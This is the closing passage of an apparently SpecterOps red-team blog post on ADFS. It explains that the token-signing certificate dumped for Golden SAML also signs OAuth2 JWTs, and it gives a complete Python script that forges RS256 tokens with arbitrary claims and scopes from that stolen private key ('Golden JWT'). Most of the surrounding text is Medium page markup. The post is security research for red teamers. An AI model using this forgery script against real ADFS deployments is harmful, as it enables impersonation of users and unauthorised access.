https://miro.medium.com/v2/resize:fit:828/1*Qtt9L3Im_suq29IdeAcbtw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*Qtt9L3Im_suq29IdeAcbtw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*Qtt9L3Im_suq29IdeAcbtw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mb pn c" width="700" height="643" loading="lazy" role="presentation"/></picture></div></div></figure><p id="2518" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">As we see during the happy flow, the claims in the token are reflected back to us:</p><figure class="pd pe pf pg ph pi pa pb paragraph-image"><div role="button" tabindex="0" class="pj pk fj pl bh pm"><div class="pa pb rh"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*2FCfKD7G3X60OpGK4yfULw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*2FCfKD7G3X60OpGK4yfULw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*2FCfKD7G3X60OpGK4yfULw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*2FCfKD7G3X60OpGK4yfULw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*2FCfKD7G3X60OpGK4yfULw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*2FCfKD7G3X60OpGK4yfULw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2FCfKD7G3X60OpGK4yfULw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*2FCfKD7G3X60OpGK4yfULw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*2FCfKD7G3X60OpGK4yfULw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*2FCfKD7G3X60OpGK4yfULw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*2FCfKD7G3X60OpGK4yfULw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*2FCfKD7G3X60OpGK4yfULw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*2FCfKD7G3X60OpGK4yfULw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*2FCfKD7G3X60OpGK4yfULw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mb pn c" width="700" height="567" loading="lazy" role="presentation"/></picture></div></div></figure><p id="c939" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">Now let’s see if we can spoof the claims in the JWT! If we analyse the contents of an existing access token, we get our hint about what is being used to sign the JWT:</p><pre class="pd pe pf pg ph ps nv pt bp pu bb bk"><span id="fa0c" class="pv nx gu nv b bg pw px l py pz">{<br/>  &quot;typ&quot;: &quot;JWT&quot;,<br/>  &quot;alg&quot;: &quot;RS256&quot;,<br/>  &quot;x5t&quot;: &quot;AYq-eHNpTwfrqqTw03y4wsIE0GQ&quot;,<br/>  &quot;kid&quot;: &quot;AYq-eHNpTwfrqqTw03y4wsIE0GQ&quot;<br/>}</span></pre><p id="e37a" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">The <code class="cx ns nt nu nv b">x5t</code> header value is the thumbprint of the certificate used to sign. Decoding this we see:</p><figure class="pd pe pf pg ph pi pa pb paragraph-image"><div role="button" tabindex="0" class="pj pk fj pl bh pm"><div class="pa pb ri"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*9L7D4gmpAI7aO1BMiY62qQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*9L7D4gmpAI7aO1BMiY62qQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*9L7D4gmpAI7aO1BMiY62qQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*9L7D4gmpAI7aO1BMiY62qQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*9L7D4gmpAI7aO1BMiY62qQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*9L7D4gmpAI7aO1BMiY62qQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9L7D4gmpAI7aO1BMiY62qQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*9L7D4gmpAI7aO1BMiY62qQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*9L7D4gmpAI7aO1BMiY62qQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*9L7D4gmpAI7aO1BMiY62qQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*9L7D4gmpAI7aO1BMiY62qQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*9L7D4gmpAI7aO1BMiY62qQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*9L7D4gmpAI7aO1BMiY62qQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*9L7D4gmpAI7aO1BMiY62qQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mb pn c" width="700" height="95" loading="lazy" role="presentation"/></picture></div></div></figure><p id="e72d" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">If we look at the signing certificate for our ADFS instance:</p><figure class="pd pe pf pg ph pi pa pb paragraph-image"><div role="button" tabindex="0" class="pj pk fj pl bh pm"><div class="pa pb rj"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*awhpMQx3oejb2ZrcMFD_AQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*awhpMQx3oejb2ZrcMFD_AQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*awhpMQx3oejb2ZrcMFD_AQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*awhpMQx3oejb2ZrcMFD_AQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*awhpMQx3oejb2ZrcMFD_AQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*awhpMQx3oejb2ZrcMFD_AQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*awhpMQx3oejb2ZrcMFD_AQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*awhpMQx3oejb2ZrcMFD_AQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*awhpMQx3oejb2ZrcMFD_AQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*awhpMQx3oejb2ZrcMFD_AQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*awhpMQx3oejb2ZrcMFD_AQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*awhpMQx3oejb2ZrcMFD_AQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*awhpMQx3oejb2ZrcMFD_AQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*awhpMQx3oejb2ZrcMFD_AQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mb pn c" width="700" height="560" loading="lazy" role="presentation"/></picture></div></div></figure><p id="52a1" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">This means that the same certificate we’ve been dumping for Golden SAML is also used for JWT signing, which makes life easier for us as the tooling and techniques for dumping this is already available <a class="af oz" href="https://aadinternals.com/post/adfs/" rel="noopener ugc nofollow" target="_blank">here</a>.</p><p id="d1c1" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">If we use the private key, we can craft a simple Python script to generate a new JWT with any claims we want:</p><pre class="pd pe pf pg ph ps nv pt bp pu bb bk"><span id="6dd0" class="pv nx gu nv b bg pw px l py pz">import jwt<br/>from cryptography.hazmat.primitives import serialization<br/>from cryptography.hazmat.primitives.asymmetric import rsa<br/>from cryptography.hazmat.primitives import hashes<br/>from cryptography.hazmat.primitives.asymmetric import padding<br/>from cryptography.x509 import load_pem_x509_certificate<br/>import base64<br/>import sys<br/>import json<br/>import hashlib<br/>import time<br/><br/>def generate_kid(cert):<br/>    public_key = cert.public_key().public_bytes(<br/>        serialization.Encoding.PEM,<br/>        serialization.PublicFormat.SubjectPublicKeyInfo<br/>    )<br/>    return base64.urlsafe_b64encode(hashlib.sha1(public_key).digest()).decode(&quot;utf-8&quot;).rstrip(&quot;=&quot;)<br/><br/>def spoof_jwt(claims, private_key, public_key, include_timestamp=True):<br/><br/>    kid = generate_kid(public_key)<br/><br/>    header = {<br/>        &quot;alg&quot;: &quot;RS256&quot;,<br/>        &quot;x5c&quot;: kid,<br/>        &quot;kid&quot;: kid<br/>    }<br/><br/>    if include_timestamp:<br/>        claims[&quot;iat&quot;] = int(time.time())<br/>        claims[&quot;exp&quot;] = claims[&quot;iat&quot;] + 600<br/>        claims[&quot;nbf&quot;] = claims[&quot;iat&quot;] - 60<br/><br/>    token = jwt.encode(claims, private_key, algorithm=&quot;RS256&quot;, headers=header)<br/>    return token<br/><br/>if __name__ == &quot;__main__&quot;:<br/><br/>    if len(sys.argv) &lt; 4:<br/>        print(&quot;Usage: python3 spoof.py &lt;private_key_path&gt; &lt;cert_path&gt; &lt;claims_path&gt;&quot;)<br/>        sys.exit(1)<br/><br/>    # Load your RSA private key<br/>    with open(sys.argv[1], &quot;rb&quot;) as key_file:<br/>        private_key = serialization.load_pem_private_key(key_file.read(), password=None)<br/><br/>    with open(sys.argv[2], &quot;rb&quot;) as cert_file:<br/>        cert = load_pem_x509_certificate(cert_file.read())<br/><br/>    with open(sys.argv[3], &quot;r&quot;) as claims_file:<br/>        claims = json.load(claims_file)<br/><br/>    token = spoof_jwt(claims, private_key, cert)<br/>    print(token)</span></pre><p id="a483" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">And again we can replace the generated access token delivered to ClaimsXRay and see that we can add any claims or scopes that we want:</p><figure class="pd pe pf pg ph pi pa pb paragraph-image"><div role="button" tabindex="0" class="pj pk fj pl bh pm"><div class="pa pb rk"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*55Es9EqPf_keNmBSWPlPUQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*55Es9EqPf_keNmBSWPlPUQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*55Es9EqPf_keNmBSWPlPUQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*55Es9EqPf_keNmBSWPlPUQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*55Es9EqPf_keNmBSWPlPUQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*55Es9EqPf_keNmBSWPlPUQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*55Es9EqPf_keNmBSWPlPUQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*55Es9EqPf_keNmBSWPlPUQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*55Es9EqPf_keNmBSWPlPUQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*55Es9EqPf_keNmBSWPlPUQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*55Es9EqPf_keNmBSWPlPUQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*55Es9EqPf_keNmBSWPlPUQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*55Es9EqPf_keNmBSWPlPUQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*55Es9EqPf_keNmBSWPlPUQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mb pn c" width="700" height="496" loading="lazy" role="presentation"/></picture></div></div></figure><h1 id="26af" class="nw nx gu bf ny nz oa ob oc od oe of og oh oi oj ok ol om on oo op oq or os ot bk">Conclusion</h1><p id="0dd8" class="pw-post-body-paragraph mu mv gu mw b mx ou mz na nb ov nd ne nf ow nh ni nj ox nl nm nn oy np nq nr gn bk">So there we have it, a brain dump of ADFS OAuth2, DRS, Device Authentication, Device Writeback and some Golden JWT. Some useful bits, and some less useful (but equally interesting) bits.</p><p id="9128" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">If you’re the one Googling for a UUID having just stumbled across your clients ADFS deployment, hopefully this post provides something to make your life a bit easier.</p><p id="7108" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">And if that’s the case, give me a shout and share the story!</p><h1 id="8d4f" class="nw nx gu bf ny nz oa ob oc od oe of og oh oi oj ok ol om on oo op oq or os ot bk">References &amp; Thanks</h1><ul class=""><li id="b7d1" class="mu mv gu mw b mx ou mz na nb ov nd ne nf ow nh ni nj ox nl nm nn oy np nq nr qg qh qi bk">Deep-dive to Azure AD device join — <a class="af oz" href="https://aadinternals.com/post/devices/" rel="noopener ugc nofollow" target="_blank">https://aadinternals.com/post/devices/</a></li><li id="d4d5" class="mu mv gu mw b mx qj mz na nb qk nd ne nf ql nh ni nj qm nl nm nn qn np nq nr qg qh qi bk">RoadTools — <a class="af oz" href="https://github.com/dirkjanm/ROADtools" rel="noopener ugc nofollow" target="_blank">https://github.com/dirkjanm/ROADtools</a></li><li id="1eb8" class="mu mv gu mw b mx qj mz na nb qk nd ne nf ql nh ni nj qm nl nm nn qn np nq nr qg qh qi bk">Further Digging into the Primary Refresh Token — <a class="af oz" href="https://dirkjanm.io/digging-further-into-the-primary-refresh-token/" rel="noopener ugc nofollow" target="_blank">https://dirkjanm.io/digging-further-into-the-primary-refresh-token/</a></li></ul></div></div></div></div></section></div></div></article></div><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="rl rm ab ja"><div class="rn ab"><a class="ro ay am ao" href="https://medium.com/tag/adfs?source=post_page-----c11f9b371811--------------------------------" rel="noopener follow"><div class="rp fj cx rq ge rr rs bf b bg z bk rt">Adfs</div></a></div><div class="rn ab"><a class="ro ay am ao" href="https://medium.com/tag/oauth2?source=post_page-----c11f9b371811--------------------------------" rel="noopener follow"><div class="rp fj cx rq ge rr rs bf b bg z bk rt">Oauth2</div></a></div><div class="rn ab"><a class="ro ay am ao" href="https://medium.com/tag/phishing?source=post_page-----c11f9b371811--------------------------------" rel="noopener follow"><div class="rp fj cx rq ge rr rs bf b bg z bk rt">Phishing</div></a></div><div class="rn ab"><a class="ro ay am ao" href="https://medium.com/tag/red-team?source=post_page-----c11f9b371811--------------------------------" rel="noopener follow"><div class="rp fj cx rq ge rr rs bf b bg z bk rt">Red Team</div></a></div></div></div></div><div class="l"></div><footer class="ru rv rw rx ry ab q rz ik c"><div class="l ae"><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="ab cp sa"><div class="ab q kt"><div class="sb l"><span class="l sc sd se e d"><div class="ab q kt ku"><div class="pw-multi-vote-icon fj jc kv kw kx"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerClapButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fspecter-ops-posts%2Fc11f9b371811&amp;operation=register&amp;redirect=https%3A%2F%2Fposts.specterops.io%2Fadfs-living-in-the-legacy-of-drs-c11f9b371811&amp;user=Adam+Chester&amp;userId=94749d3f8afc&amp;source=---footer_actions--c11f9b371811---------------------clap_footer-----------" rel="noopener follow"><div><div class="bm" aria-hidden="false"><div class="ky ao kz la lb lc am ld le lf kx"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l lg lh li lj lk ll lm"><p class="bf b dv z du"><span class="ln">--</span></p></div></div></span><span class="l h g f sf sg"><div class="ab q kt ku"><div class="pw-multi-vote-icon fj jc kv kw kx"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerClapButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fspecter-ops-posts%2Fc11f9b371811&amp;operation=register&amp;redirect=https%3A%2F%2Fposts.specterops.io%2Fadfs-living-in-the-legacy-of-drs-c11f9b371811&amp;user=Adam+Chester&amp;userId=94749d3f8afc&amp;source=---footer_actions--c11f9b371811---------------------clap_footer-----------" rel="noopener follow"><div><div class="bm" aria-hidden="false"><div class="ky ao kz la lb lc am ld le lf kx"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l lg lh li lj lk ll lm"><p class="bf b dv z du"><span class="ln">--</span></p></div></div></span></div><div class="bq ab"><div><div class="bm" aria-hidden="false"><button class="ao ky lo lp ab q fk lq lr" aria-label="responses"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="ls"><path d="M18.006 16.803c1.533-1.456 2.234-3.325 2.234-5.321C20.24 7.357 16.709 4 12.191 4S4 7.357 4 11.482c0 4.126 3.674 7.482 8.191 7.482.817 0 1.622-.111 2.393-.327.231.2.48.391.744.559 1.06.693 2.203 1.044 3.399 1.044.224-.008.4-.112.486-.287a.49.49 0 0 0-.042-.518c-.495-.67-.845-1.364-1.04-2.057a4 4 0 0 1-.125-.598zm-3.122 1.055-.067-.223-.315.096a8 8 0 0 1-2.311.338c-4.023 0-7.292-2.955-7.292-6.587 0-3.633 3.269-6.588 7.292-6.588 4.014 0 7.112 2.958 7.112 6.593 0 1.794-.608 3.469-2.027 4.72l-.195.168v.255c0 .056 0 .151.016.295.025.231.081.478.154.733.154.558.398 1.117.722 1.659a5.3 5.3 0 0 1-2.165-.845c-.276-.176-.714-.383-.941-.59z"></path></svg></button></div></div></div></div><div class="ab q"><div class="sh l ix"><div><div class="bm" aria-hidden="false"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerBookmarkButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2Fc11f9b371811&amp;operation=register&amp;redirect=https%3A%2F%2Fposts.specterops.io%2Fadfs-living-in-the-legacy-of-drs-c11f9b371811&amp;source=---footer_actions--c11f9b371811---------------------bookmark_footer-----------" rel="noopener follow"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="du lu" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></a></span></div></div></div><div class="sh l ix"><div class="bm" aria-hidden="false" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bm" aria-hidden="false"><button aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post" data-testid="footerSocialShareButton" class="af fk ah ai aj ak al mc an ao ap ex md me lr mf"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M15.218 4.931a.4.4 0 0 1-.118.132l.012.006a.45.45 0 0 1-.292.074.5.5 0 0 1-.3-.13l-2.02-2.02v7.07c0 .28-.23.5-.5.5s-.5-.22-.5-.5v-7.04l-2 2a.45.45 0 0 1-.57.04h-.02a.4.4 0 0 1-.16-.3.4.4 0 0 1 .1-.32l2.8-2.8a.5.5 0 0 1 .7 0l2.8 2.79a.42.42 0 0 1 .068.498m-.106.138.008.004v-.01zM16 7.063h1.5a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-11c-1.1 0-2-.9-2-2v-10a2 2 0 0 1 2-2H8a.5.5 0 0 1 